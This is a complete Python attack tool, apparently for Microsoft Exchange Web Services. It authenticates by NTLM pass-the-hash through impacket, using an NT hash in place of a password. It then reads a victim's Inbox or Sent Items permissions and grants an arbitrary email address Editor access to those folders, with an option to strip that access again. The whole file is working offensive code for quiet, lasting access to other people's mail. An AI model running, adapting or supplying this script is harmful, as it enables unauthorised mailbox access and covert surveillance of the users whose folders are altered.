#!python3

import ssl
import sys
import base64
import re
import binascii
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
from impacket import ntlm


def get(host, port, user, data, command):

    if command == "getinbox":
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:GetFolder>
      <m:FolderShape>
        <t:BaseShape>IdOnly</t:BaseShape>
        <t:AdditionalProperties>
          <t:FieldURI FieldURI="folder:PermissionSet"/>
        </t:AdditionalProperties>
      </m:FolderShape>
      <m:FolderIds>
        <t:DistinguishedFolderId Id="inbox" />
      </m:FolderIds>
    </m:GetFolder>
  </soap:Body>
</soap:Envelope>
'''


    elif command =='getsentitems': 
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:GetFolder>
      <m:FolderShape>
        <t:BaseShape>IdOnly</t:BaseShape>
        <t:AdditionalProperties>
          <t:FieldURI FieldURI="folder:PermissionSet"/>
        </t:AdditionalProperties>
      </m:FolderShape>
      <m:FolderIds>
        <t:DistinguishedFolderId Id="sentitems" />
      </m:FolderIds>
    </m:GetFolder>
  </soap:Body>
</soap:Envelope>
'''

    ews_url = "/EWS/Exchange.asmx"

    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, host)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", ews_url, POST_BODY, headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(ews_url))
        return False

    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False


    password1 = ''
    nt_hash = binascii.unhexlify(data)


    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, host, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", ews_url, POST_BODY, headers)
    res = session.getresponse()
    body = res.read()
    filename = user+"_"+command+".xml"
    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False

    else:
        print('[+] Valid:%s %s'%(user,data))       

        print('Save response file to %s'%(filename))
        with open(filename, 'w+', encoding='utf-8') as file_object:
            file_object.write(bytes.decode(body))
        if res.status == 200:
            pattern_name = re.compile(r"ChangeKey=\"(.*?)\"")
            name = pattern_name.findall(bytes.decode(body))
            Key = name[0]
            pattern_name = re.compile(r"Id=\"(.*?)\"")
            name = pattern_name.findall(bytes.decode(body))
            Id = name[0]
        return Id,Key

def manage(host, port, user, data, command, NewUser, ID, KEY):

    if command =='add': 
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:UpdateFolder>
      <m:FolderChanges>
        <t:FolderChange>
          <t:FolderId Id="{id}" ChangeKey="{key}" />
          <t:Updates>
            <t:SetFolderField>
              <t:FieldURI FieldURI="folder:PermissionSet" />
              <t:Folder>
                <t:PermissionSet>
                  <t:Permissions>

                    <t:Permission>
                      <t:UserId>
                        <t:DistinguishedUser>Default</t:DistinguishedUser>
                      </t:UserId>
                      <t:CanCreateItems>false</t:CanCreateItems>
                      <t:CanCreateSubFolders>false</t:CanCreateSubFolders>
                      <t:IsFolderOwner>false</t:IsFolderOwner>
                      <t:IsFolderVisible>false</t:IsFolderVisible>
                      <t:IsFolderContact>false</t:IsFolderContact>
                      <t:EditItems>None</t:EditItems>
                      <t:DeleteItems>None</t:DeleteItems>
                      <t:ReadItems>None</t:ReadItems>
                      <t:PermissionLevel>None</t:PermissionLevel>
                    </t:Permission>

                    <t:Permission>
                    <t:UserId>
                      <t:DistinguishedUser>Anonymous</t:DistinguishedUser>
                    </t:UserId>
                    <t:CanCreateItems>false</t:CanCreateItems>
                    <t:CanCreateSubFolders>false</t:CanCreateSubFolders>
                    <t:IsFolderOwner>false</t:IsFolderOwner>
                    <t:IsFolderVisible>false</t:IsFolderVisible>
                    <t:IsFolderContact>false</t:IsFolderContact>
                    <t:EditItems>None</t:EditItems>
                    <t:DeleteItems>None</t:DeleteItems>
                    <t:ReadItems>None</t:ReadItems>
                    <t:PermissionLevel>None</t:PermissionLevel>
                    </t:Permission>

                    <t:Permission>
                      <t:UserId>
                        <t:PrimarySmtpAddress>{mail}</t:PrimarySmtpAddress>
                      </t:UserId>
                      <t:PermissionLevel>Editor</t:PermissionLevel>
                    </t:Permission>

                  </t:Permissions>
                </t:PermissionSet>
              </t:Folder>
            </t:SetFolderField>
          </t:Updates>
        </t:FolderChange>
      </m:FolderChanges>
    </m:UpdateFolder>
  </soap:Body>
</soap:Envelope>
'''

        POST_BODY = POST_BODY.format(id=ID, key=KEY, mail=NewUser)

    elif command =='restore': 
        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013_SP1" />
  </soap:Header>
  <soap:Body>
    <m:UpdateFolder>
      <m:FolderChanges>
        <t:FolderChange>
          <t:FolderId Id="{id}" ChangeKey="{key}" />
          <t:Updates>
            <t:SetFolderField>
              <t:FieldURI FieldURI="folder:PermissionSet" />
              <t:Folder>
                <t:PermissionSet>
                  <t:Permissions>

                    <t:Permission>
                      <t:UserId>
                        <t:DistinguishedUser>Default</t:DistinguishedUser>
                      </t:UserId>
                      <t:CanCreateItems>false</t:CanCreateItems>
                      <t:CanCreateSubFolders>false</t:CanCreateSubFolders>
                      <t:IsFolderOwner>false</t:IsFolderOwner>
                      <t:IsFolderVisible>false</t:IsFolderVisible>
                      <t:IsFolderContact>false</t:IsFolderContact>
                      <t:EditItems>None</t:EditItems>
                      <t:DeleteItems>None</t:DeleteItems>
                      <t:ReadItems>None</t:ReadItems>
                      <t:PermissionLevel>None</t:PermissionLevel>
                    </t:Permission>

                    <t:Permission>
                    <t:UserId>
                      <t:DistinguishedUser>Anonymous</t:DistinguishedUser>
                    </t:UserId>
                    <t:CanCreateItems>false</t:CanCreateItems>
                    <t:CanCreateSubFolders>false</t:CanCreateSubFolders>
                    <t:IsFolderOwner>false</t:IsFolderOwner>
                    <t:IsFolderVisible>false</t:IsFolderVisible>
                    <t:IsFolderContact>false</t:IsFolderContact>
                    <t:EditItems>None</t:EditItems>
                    <t:DeleteItems>None</t:DeleteItems>
                    <t:ReadItems>None</t:ReadItems>
                    <t:PermissionLevel>None</t:PermissionLevel>
                    </t:Permission>

                  </t:Permissions>
                </t:PermissionSet>
              </t:Folder>
            </t:SetFolderField>
          </t:Updates>
        </t:FolderChange>
      </m:FolderChanges>
    </m:UpdateFolder>
  </soap:Body>
</soap:Envelope>
'''

        POST_BODY = POST_BODY.format(id=ID, key=KEY)


    ews_url = "/EWS/Exchange.asmx"

    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, host)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", ews_url, POST_BODY, headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(ews_url))
        return False

    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False


    password1 = ''
    nt_hash = binascii.unhexlify(data)


    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, host, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", ews_url, POST_BODY, headers)
    res = session.getresponse()
    body = res.read()
    filename = user+"_"+command+".xml"
    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False

    else:

        print('Save response file to %s'%(filename))
        with open(filename, 'w+', encoding='utf-8') as file_object:
            file_object.write(bytes.decode(body))
        if res.status == 200:
            if 'NoError' in bytes.decode(body):
              print("Ok")

        return True



if __name__ == '__main__':
    if len(sys.argv)>7 or len(sys.argv)<6:
        print('%s aaa.com 443 user1 c5a237b7e9d8e708d8436b6148a25fa1 getinbox'%(sys.argv[0]))
        print('%s aaa.com 443 user1 c5a237b7e9d8e708d8436b6148a25fa1 addinbox new@aaa.com'%(sys.argv[0]))
        print('%s aaa.com 443 user1 c5a237b7e9d8e708d8436b6148a25fa1 removeinbox new@aaa.com'%(sys.argv[0]))

        print('%s aaa.com 443 user1 c5a237b7e9d8e708d8436b6148a25fa1 getsend'%(sys.argv[0]))
        print('%s aaa.com 443 user1 c5a237b7e9d8e708d8436b6148a25fa1 addsend new@aaa.com'%(sys.argv[0]))
        print('%s aaa.com 443 user1 c5a237b7e9d8e708d8436b6148a25fa1 removesend new@aaa.com'%(sys.argv[0]))
        sys.exit(0)
    else:
        if sys.argv[5] == "getsend":
          get(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "getsentitems")
        elif sys.argv[5] == "addsend":
          Id,Key = get(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "getsentitems")
          manage(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "add", sys.argv[6], Id, Key)        
        elif sys.argv[5] == "removesend":
          Id,Key = get(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "getsentitems")
          manage(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "restore", sys.argv[6], Id, Key)   

        elif sys.argv[5] == "getinbox":
          get(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "getinbox")
        elif sys.argv[5] == "addinbox":
          Id,Key = get(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "getinbox")
          manage(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "add", sys.argv[6], Id, Key)        
        elif sys.argv[5] == "removeinbox":
          Id,Key = get(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "getinbox")
          manage(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], "restore", sys.argv[6], Id, Key)
        else:
          print("Input error")



